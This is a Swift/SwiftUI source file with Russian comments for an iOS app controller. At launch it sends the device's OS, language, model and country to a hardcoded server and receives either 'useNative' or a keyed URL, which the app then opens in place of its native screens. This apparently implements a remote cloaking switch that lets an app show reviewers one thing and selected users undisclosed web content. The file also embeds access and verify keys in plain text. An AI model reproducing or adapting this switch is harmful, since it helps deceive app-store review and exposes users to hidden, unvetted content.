import SwiftUI
import WebKit
import Combine

// MARK: - Конфиг сервера
enum RemoteConfig {
    static let endpointURL = "https://wastelesswatch.com/lander/new-ios-server/server.php"
    static let accessKey   = "nD5zWkP7rV1uGe8"
    static let verifyKey   = "YBXAQXCKMSAJSYCQEWHF"
}

// MARK: - Хелперы для параметров
private func systemVersionInfo() -> String { "\(UIDevice.current.systemName) \(UIDevice.current.systemVersion)" }

private func currentLanguageCode() -> String {
    let lang = Locale.preferredLanguages.first ?? "en"
    return lang.split(separator: "-").first.map { String($0).lowercased() } ?? "en"
    //    return "pt"
}

private func hardwareModelIdentifier() -> String {
    var sys = utsname(); uname(&sys)
    return withUnsafePointer(to: &sys.machine) {
        $0.withMemoryRebound(to: CChar.self, capacity: 1) { String(cString: $0) }
    }
}

private func activeRegionCode() -> String? {
    Locale.current.regionCode
    //    return "BR"
}

// MARK: - Сбор URL запроса
private func prepareRequestURL() -> URL? {
    var comps = URLComponents(string: RemoteConfig.endpointURL)
    var items: [URLQueryItem] = [
        .init(name: "p", value: RemoteConfig.accessKey),
        .init(name: "os", value: systemVersionInfo()),
        .init(name: "lng", value: currentLanguageCode()),
        .init(name: "devicemodel", value: hardwareModelIdentifier())
        
    ]
    if let country = activeRegionCode() {
        items.append(.init(name: "country", value: country))
    }
    comps?.queryItems = items
    
    let built = comps?.url
    print("🔹 [prepareRequestURL] → \(built?.absoluteString ?? "nil")")
    return built
}

// MARK: - Статусы
enum Status: Equatable {
    case idle
    case validating
    case approved(token: String, url: URL)
    case useNative
}

// MARK: - Контроллер доступа
@MainActor
final class AccessController: ObservableObject {
    @Published var current: Status = .idle
    
    func beginCheck() {
        print("🚀 beginCheck()")
        current = .validating
        guard let reqURL = prepareRequestURL() else {
            print("❌ prepareRequestURL() → nil, fallback useNative")
            current = .useNative
            print("useNative")
            
            return
        }
        Task { await fetchDecision(from: reqURL) }
    }
    
    private func fetchDecision(from url: URL) async {
        do {
            print("Отправляем запрос: \(url.absoluteString)")
            let (data, response) = try await URLSession.shared.data(from: url)
            
            if let http = response as? HTTPURLResponse {
                print("HTTP status: \(http.statusCode)")
            }
            
            let body = String(decoding: data, as: UTF8.self)
            print("Ответ от сервера (raw): '\(body)'")
            let trimmed = body.trimmingCharacters(in: .whitespacesAndNewlines)
            
            if trimmed.caseInsensitiveCompare("useNative") == .orderedSame {
                print("⚠️ Сервер вернул 'useNative'")
                current = .useNative
                return
            }
            
            let parts = trimmed.split(separator: "#", maxSplits: 1, omittingEmptySubsequences: false)
            guard parts.count == 2 else {
                print("Формат ответа не '#'-разделён → \(parts)")
                current = .useNative
                return
            }
            
            let token = String(parts[0])
            let urlPart = String(parts[1])
            print("token = \(token)")
            print("urlPart = \(urlPart)")
            
            guard token == RemoteConfig.verifyKey else {
                print("verifyKey не совпал (\(token)) ≠ \(RemoteConfig.verifyKey)")
                current = .useNative
                return
            }
            guard let finalURL = URL(string: urlPart) else {
                print("Не удалось создать URL из '\(urlPart)'")
                current = .useNative
                return
            }
            
            print("Сервер подтвердил verifyKey, открываем URL: \(finalURL)")
            current = .approved(token: token, url: finalURL)
        } catch {
            print("Ошибка сети: \(error.localizedDescription)")
            current = .useNative
        }
    }
}
